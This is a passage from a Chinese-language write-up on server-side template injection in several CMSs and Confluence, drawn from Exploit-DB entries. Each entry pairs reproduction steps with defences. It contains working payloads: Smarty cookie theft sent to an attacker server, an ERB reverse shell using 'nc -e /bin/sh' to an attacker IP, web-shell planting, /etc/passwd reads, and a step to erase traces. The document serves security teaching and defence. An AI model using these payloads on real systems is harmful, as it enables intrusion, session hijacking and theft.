### **与其他SSTI漏洞对比**

| 漏洞名称                 | 利用场景             | 权限要求   | 注入方式             | 关键函数/语法                       |      |
| :----------------------- | :------------------- | :--------- | :------------------- | :---------------------------------- | ---- |
| **Pyro CMS SSTI**        | 角色描述编辑（后台） | 管理员权限 | Twig过滤器`map()`    | `{{[...]         | map("system")}}` |      |
| **Winter CMS SSTI**      | CMS模板编辑（后台）  | 管理员权限 | Twig内置函数`dump()` | `{{ dump() }}`                      |      |
| **FoF Pretty Mail SSTI** | 邮件模板编辑（后台） | 管理员权限 | 直接调用`system()`   | `{{ system() }}`                    |      |
| **Gibbon LMS SSTI**      | 系统配置模块（后台） | 管理员权限 | Twig过滤器`filter()` | `{{[...]         | filter()}}`      |      |

------

### **攻击链扩展**

- **权限维持**：通过RCE植入Web Shell（如`{{["echo '<?php system($_GET[cmd]); ?>' > shell.php"]|map("system")}}`）。
- **横向渗透**：利用服务器权限扫描内网服务或窃取凭证。
- **数据泄露**：执行`cat /etc/passwd`或读取数据库配置文件。

------

### **检测与修复验证**

1. **漏洞检测**：
   - 输入`{{["echo test"]|map("system")|join}}`，观察是否输出`test`。
2. **修复验证**：
   - 检查角色描述字段是否过滤`{{}}`语法或禁用`system`函数。
   - 确认Twig配置中`map`过滤器无法调用危险函数。

------

**总结**：Pyro CMS 3.9的SSTI漏洞通过角色描述字段直接执行系统命令，攻击路径简单且破坏性强。需结合严格的输入过滤和权限隔离进行防御。

## 六、 CmsMadeSimple v2.2.17 SSTI漏洞分析

[CmsMadeSimple v2.2.17 - session hijacking via Server-Side Template Injection (SSTI) - PHP webapps Exploit](https://www.exploit-db.com/exploits/51599)

### **漏洞概述**

**漏洞名称**：CmsMadeSimple v2.2.17 - 服务端模板注入（SSTI）导致的会话劫持
**风险等级**：高危
**影响版本**：CmsMadeSimple v2.2.17
**漏洞类型**：服务端模板注入（SSTI）
**利用后果**：攻击者可窃取用户会话Cookie，劫持合法用户身份，进一步执行未授权操作。

------

### **漏洞复现步骤**

1. **登录系统**

   - 使用测试账户或低权限账户登录后台。

2. **定位注入点**

   - 进入`内容管理 > 新增内容`（路径：`/admin/moduleinterface.php`）。

3. **注入Payload**

   - 在`content_en`字段插入以下Smarty模板代码：

     ```
     {$smarty.version}  
     {{7*7}}  
     {$smarty.now}  
     {$smarty.template}  
     <img src="攻击者服务器/{$smarty.cookies.CMSSESSID852a6e69ca02}">  
     <img src="攻击者服务器/{$smarty.cookies.34a3083b62a225efa0bc6b5b43335d226264c2c1}">  
     <img src="攻击者服务器/{$smarty.cookies.__c}">  
     ```
   
4. **触发漏洞**

   - 保存内容后，诱使用户访问该页面。
   - 攻击者服务器接收用户Cookie（如`CMSSESSID`、`__c`），实现会话劫持。

------

### **漏洞原理分析**

1. **模板引擎**：CmsMadeSimple使用Smarty模板引擎，但未对用户输入内容进行过滤。
2. **注入逻辑**：
   - `{$smarty.cookies.XXX}`直接读取用户Cookie并嵌入页面。
   - 通过`<img>`标签将Cookie发送至攻击者控制的服务器。
3. **权限依赖**：需内容编辑权限，但危害显著（横向权限提升、数据泄露）。

------

### **关键知识点总结**

| 漏洞阶段        | 技术细节                                    | 关键知识点                                               |
| :-------------- | :------------------------------------------ | :------------------------------------------------------- |
| **注入点定位**  | 内容管理模块（`content_en`字段）            | 低权限用户利用、功能路径（`/admin/moduleinterface.php`） |
| **Payload构造** | 通过Smarty变量`{$smarty.cookies}`窃取Cookie | Smarty模板语法（`{$}`）、全局变量访问（`cookies`）       |
| **信息泄露**    | 利用`<img>`标签外传Cookie至远程服务器       | HTTP请求触发、数据外泄机制                               |
| **漏洞验证**    | 攻击者服务器接收Cookie日志，确认会话劫持    | 外部服务监听、攻击链闭环验证                             |

------

### **防御建议**

1. **输入过滤**：对用户输入内容中的Smarty语法（`{$}`、`{{}}`）进行转义或禁用。
2. **权限控制**：限制内容编辑权限，避免低权限用户操作敏感功能。
3. **输出编码**：在渲染页面时对动态内容进行HTML编码，防止标签注入。
4. **更新补丁**：升级至官方修复版本，或禁用模板引擎的Cookie变量访问。

------

### **与其他SSTI漏洞对比**

| 漏洞名称                 | 利用场景             | 权限要求     | 注入方式                      | 关键函数/语法                              |      |
| :----------------------- | :------------------- | :----------- | :---------------------------- | :----------------------------------------- | ---- |
| **CmsMadeSimple SSTI**   | 内容编辑模块（后台） | 内容编辑权限 | Smarty变量`{$smarty.cookies}` | `{$smarty.cookies.XXX}`                    |      |
| **Pyro CMS SSTI**        | 角色描述编辑（后台） | 管理员权限   | Twig过滤器`map("system")`     | `{{[...]                | map("system")}}` |      |
| **Winter CMS SSTI**      | CMS模板编辑（后台）  | 管理员权限   | Twig内置函数`dump()`          | `{{ dump() }}`                             |      |
| **FoF Pretty Mail SSTI** | 邮件模板编辑（后台） | 管理员权限   | 直接调用`system()`            | `{{ system() }}`                           |      |

------

### **攻击链扩展**

- **横向移动**：通过劫持管理员Cookie访问后台功能，进一步植入恶意代码。
- **数据窃取**：读取用户隐私数据或数据库配置（如`{$smarty.config}`）。
- **持久化攻击**：修改系统模板植入长期后门。

------

### **检测与修复验证**

1. **漏洞检测**：
   - 输入`{$smarty.version}`观察是否返回Smarty版本号。
   - 尝试注入`<img src="外部服务器/{$smarty.cookies.TEST}">`验证外传请求。
2. **修复验证**：
   - 检查内容字段是否过滤`{$smarty.cookies}`语法。
   - 确认页面渲染时动态内容已进行HTML编码。

------

**总结**：CmsMadeSimple的SSTI漏洞通过模板变量直接泄露用户Cookie，攻击门槛低且危害直接。需结合严格的输入过滤和权限隔离阻断攻击路径。

## 七、 MotoCMS 3.4.3 SSTI漏洞分析

[MotoCMS Version 3.4.3 - Server-Side Template Injection (SSTI) - Multiple webapps Exploit](https://www.exploit-db.com/exploits/51499)

### **漏洞概述**

**漏洞名称**：MotoCMS 3.4.3 - 服务端模板注入（SSTI）
**风险等级**：高危
**影响版本**：MotoCMS 3.0.27（标题版本3.4.3可能存在矛盾，需以实际测试为准）
**漏洞类型**：服务端模板注入（SSTI）
**利用后果**：攻击者可执行任意模板代码，导致敏感信息泄露或远程代码执行（RCE）。

------

### **漏洞复现步骤**

1. **定位注入点**

   - 访问路径：`/store/category/search/`
   - 参数：`keyword`（通过GET请求传递）。

2. **注入Payload**

   - 构造URL：

     ```
     https://template189526.motopreview.com/store/category/search/?page=1&limit=36&keyword={{7*7}}  
     ```
   
3. **触发漏洞**

   - 发送GET请求，观察返回页面中`keyword`参数的值被解析为`49`，确认SSTI存在。

------

### **漏洞原理分析**

1. **模板引擎**：MotoCMS使用未明示的模板引擎（可能是Twig或类似引擎），未对用户输入的`keyword`参数过滤。
2. **注入逻辑**：
   - `{{7*7}}`被模板引擎解析为算术表达式，输出计算结果`49`。
   - 进一步利用可构造恶意Payload（如调用系统函数）。
3. **攻击面**：无需认证，直接通过URL参数触发，攻击门槛低。

------

### **关键知识点总结**

| 漏洞阶段        | 技术细节                           | 关键知识点                   |
| :-------------- | :--------------------------------- | :--------------------------- |
| **注入点定位**  | URL参数`keyword`（GET请求）        | 参数注入、无需权限依赖       |
| **Payload构造** | 使用`{{}}`语法注入模板表达式       | 模板引擎语法基础（动态解析） |
| **漏洞触发**    | 直接访问构造的URL触发模板渲染      | GET请求触发、参数即时解析    |
| **漏洞验证**    | 返回结果中显示`49`，确认表达式执行 | 算术运算验证、输出反馈机制   |

------

### **防御建议**

1. **输入过滤**：对`keyword`等参数中的`{{}}`语法进行转义或禁止使用。
2. **沙盒机制**：限制模板引擎的执行环境，禁用危险函数（如`os.system`）。
3. **版本升级**：升级至官方修复版本，或禁用未使用的模板功能。
4. **日志监控**：监控异常参数（含`{{`、`}}`）的访问请求。

------

### **与其他SSTI漏洞对比**

| 漏洞名称               | 利用场景             | 权限要求     | 注入方式             | 关键函数/语法                  |      |
| :--------------------- | :------------------- | :----------- | :------------------- | :----------------------------- | ---- |
| **MotoCMS SSTI**       | URL参数（GET请求）   | 无需权限     | 直接注入`{{}}`语法   | `{{7*7}}`                      |      |
| **CmsMadeSimple SSTI** | 内容编辑字段（后台） | 内容编辑权限 | Smarty变量`{$...}`   | `{$smarty.cookies}`            |      |
| **Pyro CMS SSTI**      | 角色描述字段（后台） | 管理员权限   | Twig过滤器`map()`    | `{{[...]            | map()}}` |      |
| **Winter CMS SSTI**    | CMS模板编辑（后台）  | 管理员权限   | Twig内置函数`dump()` | `{{ dump() }}`                 |      |

------

### **攻击链扩展**

- **信息泄露**：通过`{{config}}`或`{{settings}}`泄露数据库配置。
- **RCE升级**：结合模板引擎特性调用系统命令（如`{{system('id')}}`）。
- **持久化攻击**：篡改页面模板植入恶意代码（如挖矿脚本）。

------

### **检测与修复验证**

1. **漏洞检测**：
   - 输入`{{7*7}}`观察是否返回`49`。
   - 尝试注入`{{'test'}}`验证字符串解析。
2. **修复验证**：
   - 检查`keyword`参数是否过滤`{{}}`语法。
   - 确认模板引擎配置禁用动态代码执行。

------

**总结**：MotoCMS的SSTI漏洞通过URL参数直接触发，无需权限即可验证，潜在危害极大。建议立即修复并加强输入过滤机制。

## 八、 Camaleon CMS v2.7.0 SSTI漏洞分析

[Camaleon CMS v2.7.0 - Server-Side Template Injection (SSTI) - Ruby webapps Exploit](https://www.exploit-db.com/exploits/51489)

### **漏洞概述**

**漏洞名称**：Camaleon CMS v2.7.0 - 服务端模板注入（SSTI）
**CVE编号**：CVE-2023-30145
**风险等级**：高危
**影响版本**：Camaleon CMS < 2.7.0
**漏洞类型**：服务端模板注入（SSTI）
**利用后果**：攻击者可读取敏感文件（如`/etc/passwd`），甚至实现远程代码执行（RCE）。

------

### **漏洞复现步骤**

1. **定位注入点**

   - 访问后台文件上传功能：`/admin/media/upload`。

2. **注入Payload**

   - 上传文件时，在`formats`参数中插入ERB模板代码：

     ```
   test<%= 7*7 %>test       // 验证漏洞存在（返回`test49test`）
     dqopi<%= File.open('/etc/passwd').read %>fdfdsf  // 读取系统文件
   ```
   
3. **触发漏洞**

   - 观察响应中返回计算结果或文件内容，确认漏洞成功利用。

------

### **漏洞原理分析**

1. **模板引擎**：Camaleon CMS使用ERB（Ruby模板引擎），未对用户输入的`formats`参数过滤。
2. **注入逻辑**：
   - `<%= ... %>`语法直接执行Ruby代码，导致模板引擎解析恶意指令。
   - 通过`File.open`函数读取系统文件，泄露敏感信息。
3. **权限依赖**：需后台管理员权限访问文件上传功能，但危害直接（文件泄露/RCE）。

------

### **关键知识点总结**

| 漏洞阶段        | 技术细节                                            | 关键知识点                                   |
| :-------------- | :-------------------------------------------------- | :------------------------------------------- |
| **注入点定位**  | 文件上传接口的`formats`参数（POST请求）             | 后台权限依赖、参数注入（多部分表单数据）     |
| **Payload构造** | 利用ERB语法`<%= %>`执行Ruby代码                     | ERB模板语法、Ruby文件操作函数（`File.open`） |
| **信息泄露**    | 通过`File.open('/etc/passwd').read`读取系统文件内容 | 敏感文件路径、Ruby代码执行与输出渲染         |
| **漏洞验证**    | 响应中返回计算结果（如`49`）或文件内容              | 输出反馈机制、攻击链闭环验证                 |

------

### **防御建议**

1. **输入过滤**：对`formats`等参数中的`<%=`、`%>`进行转义或禁用。
2. **沙盒机制**：限制模板引擎的执行环境，禁止调用`File.open`等危险函数。
3. **权限控制**：严格限制后台文件上传功能的访问权限。
4. **版本升级**：升级至Camaleon CMS 2.7.0或更高版本。

------

### **与其他SSTI漏洞对比**

| 漏洞名称               | 利用场景             | 权限要求     | 注入方式           | 关键函数/语法                              |      |
| :--------------------- | :------------------- | :----------- | :----------------- | :----------------------------------------- | ---- |
| **Camaleon CMS SSTI**  | 文件上传接口（后台） | 管理员权限   | ERB语法`<%= %>`    | `<%= File.open(...) %>`                    |      |
| **MotoCMS SSTI**       | URL参数（GET请求）   | 无需权限     | 直接注入`{{}}`语法 | `{{7*7}}`                                  |      |
| **CmsMadeSimple SSTI** | 内容编辑字段（后台） | 内容编辑权限 | Smarty变量`{$...}` | `{$smarty.cookies}`                        |      |
| **Pyro CMS SSTI**      | 角色描述字段（后台） | 管理员权限   | Twig过滤器`map()`  | `{{[...]                | map("system")}}` |      |

------

### **攻击链扩展**

- **横向渗透**：通过读取数据库配置文件（如`config/database.yml`）获取数据库权限。
- **RCE升级**：结合`system("id")`或反连Shell（如`<% system("nc -e /bin/sh 攻击者IP 端口") %>`）。
- **持久化后门**：篡改模板文件植入Web Shell。

------

### **检测与修复验证**

1. **漏洞检测**：
   - 注入`test<%= 7*7 %>test`，检查响应是否包含`49`。
2. **修复验证**：
   - 确认`formats`参数已过滤ERB语法，`<%=`被转义为安全字符。
   - 验证`File.open`等函数无法在模板中调用。

------

**总结**：Camaleon CMS的SSTI漏洞通过文件上传接口的`formats`参数直接执行Ruby代码，攻击路径清晰且危害性高。需结合输入过滤、权限隔离和版本升级进行防御。

## 九、 Grav CMS 1.7.10 SSTI漏洞分析

[Grav CMS 1.7.10 - Server-Side Template Injection (SSTI) (Authenticated) - PHP webapps Exploit](https://www.exploit-db.com/exploits/49961)

### **漏洞概述**

**漏洞名称**：Grav CMS 1.7.10 - 服务端模板注入（SSTI）
**CVE编号**：CVE-2021-29440
**风险等级**：高危
**影响版本**：Grav CMS 1.7.10
**漏洞类型**：服务端模板注入（SSTI）
**利用后果**：攻击者可执行任意系统命令，完全控制服务器。

------

### **漏洞复现步骤**

1. **登录系统**

   - 使用管理员账号（需页面创建权限）登录后台。

2. **创建恶意页面**

   - 进入页面创建功能（`/admin/pages`），在页面内容字段注入Twig Payload：

     ```
  {{ system('id') }}  
     ```

3. **触发漏洞**

   - 访问创建的页面，触发模板渲染并执行命令，返回命令结果（如用户ID）。

4. **清理痕迹**

   - 删除创建的页面，避免被检测。

------

### **漏洞原理分析**

1. **模板引擎**：Grav CMS使用Twig模板引擎，但未对页面内容字段的输入过滤。
2. **注入逻辑**：
   - `{{ system(...) }}`直接调用Twig的`system`函数执行系统命令。
   - 模板渲染时解析恶意代码，导致RCE。
3. **权限依赖**：需后台管理权限（页面创建权限），但危害性极高。

------

### **关键知识点总结**

| 漏洞阶段        | 技术细节                                | 关键知识点                                 |
| :-------------- | :-------------------------------------- | :----------------------------------------- |
| **注入点定位**  | 页面内容字段（后台页面创建功能）        | 后台权限依赖、Twig模板动态渲染             |
| **Payload构造** | 利用Twig语法`{{ system(...) }}`执行命令 | Twig内置函数`system()`、命令拼接技巧       |
| **命令执行**    | 通过访问恶意页面触发模板渲染            | 模板渲染与代码执行的关联性、无过滤直接解析 |
| **漏洞验证**    | 页面返回命令执行结果（如`uid`、`gid`）  | 输出反馈机制、攻击链闭环验证               |

------

### **防御建议**

1. **输入过滤**：对页面内容中的`{{}}`语法和危险函数（如`system`）进行转义或禁用。
2. **权限控制**：严格限制后台页面创建权限，遵循最小权限原则。
3. **沙盒机制**：在Twig配置中启用沙盒模式，禁止执行系统级函数。
4. **升级补丁**：升级至官方修复版本（Grav CMS 1.7.11+）。

------

### **与其他SSTI漏洞对比**

| 漏洞名称              | 利用场景             | 权限要求   | 注入方式           | 关键函数/语法                              |      |
| :-------------------- | :------------------- | :--------- | :----------------- | :----------------------------------------- | ---- |
| **Grav CMS SSTI**     | 页面内容字段（后台） | 管理员权限 | Twig语法`system()` | `{{ system('id') }}`                       |      |
| **Camaleon CMS SSTI** | 文件上传接口（后台） | 管理员权限 | ERB语法`<%= %>`    | `<%= File.open(...) %>`                    |      |
| **MotoCMS SSTI**      | URL参数（GET请求）   | 无需权限   | 直接注入`{{}}`语法 | `{{7*7}}`                                  |      |
| **Pyro CMS SSTI**     | 角色描述字段（后台） | 管理员权限 | Twig过滤器`map()`  | `{{[...]                | map("system")}}` |      |

------

### **攻击链扩展**

- **横向渗透**：通过执行`cat /etc/shadow`获取用户哈希，尝试横向破解。
- **持久化后门**：植入Web Shell（如`{{ system('echo "<?php system($_GET[cmd]); ?>" > shell.php') }}`）。
- **数据泄露**：读取数据库配置文件（如`user/config/security.yaml`）。

------

### **检测与修复验证**

1. **漏洞检测**：
   - 注入`{{7*7}}`观察是否返回`49`。
   - 尝试执行`{{ system('whoami') }}`验证命令执行。
2. **修复验证**：
   - 检查页面内容字段是否过滤`{{`和`system`关键字。
   - 确认Twig配置禁用`system`函数。

------

**总结**：Grav CMS的SSTI漏洞通过后台页面内容字段直接执行系统命令，攻击路径明确且破坏性强。需结合严格的权限控制和输入过滤机制进行防御。

## 十、 Atlassian Confluence Widget Connector Macro SSTI漏洞分析

[Atlassian Confluence Widget Connector Macro - SSTI - Multiple webapps Exploit](https://www.exploit-db.com/exploits/49465)

### **漏洞概述**

**漏洞名称**：Atlassian Confluence Widget Connector Macro - 服务端模板注入（SSTI）
**CVE编号**：CVE-2019-3396
**风险等级**：高危
**影响版本**：Confluence Server < 6.14.3
**漏洞类型**：服务端模板注入（SSTI）
**利用后果**：攻击者可遍历服务器文件系统或通过上传模板文件实现远程代码执行（RCE）。

------

### **漏洞复现步骤**

#### **模式1：文件系统遍历（无需认证）**

1. **构造请求**：

   - 发送POST请求至`/rest/tinymce/1/macro/preview`，注入`_template`参数：

     ```
     {
         "contentId": "随机ID",
         "macro": {
             "name": "widget",
             "params": {
                 "_template": "file://目标路径",
                 "url": "https://诱饵URL"
             }
         }
     }
     ```
   
2. **触发漏洞**：

   - 解析响应内容，获取文件内容或目录列表。

#### **模式2：RCE（需认证）**

1. **创建个人空间**：
   - 通过`/rest/create-dialog/1.0/space-blueprint/create-personal-space`创建用户个人空间。
2. **获取空间ID与主页ID**：
   - 解析用户个人空间页面，提取`spaceKey`和`homepageId`。
3. **上传恶意模板**：
   - 构造Velocity模板文件，通过`/pages/doattachfile.action`上传至个人空间附件目录。
4. **触发模板执行**：
   - 利用`_template`参数加载本地模板文件路径，执行命令并获取输出。

------

### **漏洞原理分析**

1. **模板引擎**：Confluence使用Velocity模板引擎，但未对`_template`参数过滤，导致路径遍历或模板注入。
2. **注入逻辑**：
   - **文件遍历**：通过`file://`协议直接读取服务器文件。
   - **RCE**：上传包含Java Runtime调用的Velocity模板，利用路径遍历加载并执行。
3. **权限依赖**：
   - 文件遍历无需认证，RCE需用户会话（任意权限）。

------

### **关键知识点总结**

| 漏洞阶段        | 技术细节                                        | 关键知识点                                                   |
| :-------------- | :---------------------------------------------- | :----------------------------------------------------------- |
| **注入点定位**  | Widget Connector宏的`_template`参数（POST请求） | Velocity模板语法、路径遍历协议（`file://`）                  |
| **Payload构造** | 利用`file://`协议遍历文件系统或加载本地模板文件 | Velocity模板中的Java反射调用（`java.lang.Runtime`）          |
| **会话管理**    | 通过`JSESSIONID`维持认证状态                    | Cookie会话机制、CSRF令牌获取（`atl_token`）                  |
| **文件上传**    | 将Velocity模板作为附件上传至个人空间            | 附件存储路径规则（`/attachments/ver003/...`）                |
| **漏洞触发**    | 解析响应中的HTML内容提取文件内容或命令输出      | 输出编码处理（字符转ASCII码）、HTML元素提取（`div.wiki-content`） |

------

### **防御建议**

1. **输入过滤**：禁止`_template`参数中的`file://`协议和Velocity语法。
2. **权限控制**：限制低权限用户访问Widget Connector宏功能。
3. **沙盒机制**：在Velocity配置中禁用危险Java类（如`Runtime`）。
4. **升级补丁**：升级至Confluence 6.14.3或更高版本。
5. **文件监控**：监控附件目录中的异常文件（如`.vm`模板）。

------

### **与其他SSTI漏洞对比**

| 漏洞名称              | 利用场景                 | 权限要求          | 注入方式                  | 关键函数/语法                                   |      |
| :-------------------- | :----------------------- | :---------------- | :------------------------ | :---------------------------------------------- | ---- |
| **Confluence SSTI**   | Widget宏参数（POST请求） | 可选（RCE需认证） | Velocity模板注入          | `#set($ex = Runtime.exec())`                    |      |
| **Grav CMS SSTI**     | 页面内容字段（后台）     | 管理员权限        | Twig语法`system()`        | `{{ system('id') }}`                            |      |
| **Camaleon CMS SSTI** | 文件上传接口（后台）     | 管理员权限        | ERB语法`<%= %>`           | `<%= File.open(...) %>`                         |      |
| **Pyro CMS SSTI**     | 角色描述字段（后台）     | 管理员权限        | Twig过滤器`map("system")` | `{{[...]                     | map("system")}}` |      |

------

### **攻击链扩展**

- **横向渗透**：通过`/etc/passwd`获取用户列表，尝试SSH爆破或哈希破解。
- **持久化后门**：植入Web Shell或定时任务（如`crontab`）。
- **数据泄露**：读取数据库配置（`confluence.cfg.xml`）或敏感环境变量。

------

### **检测与修复验证**

1. **漏洞检测**：
   - 注入`_template=file:///etc/passwd`，检查是否返回文件内容。
   - 上传测试模板，验证能否执行`whoami`命令。
2. **修复验证**：
   - 检查`_template`参数是否被过滤，`file://`协议是否禁用。
   - 确认Velocity配置中`Runtime`类调用被阻止。

------

**总结**：CVE-2019-3396通过Widget宏参数实现SSTI，攻击面广且利用灵活。文件遍历模式无需权限，RCE模式需低权限会话，但均可造成严重危害。建议结合输入过滤、权限隔离和版本升级进行深度防御。
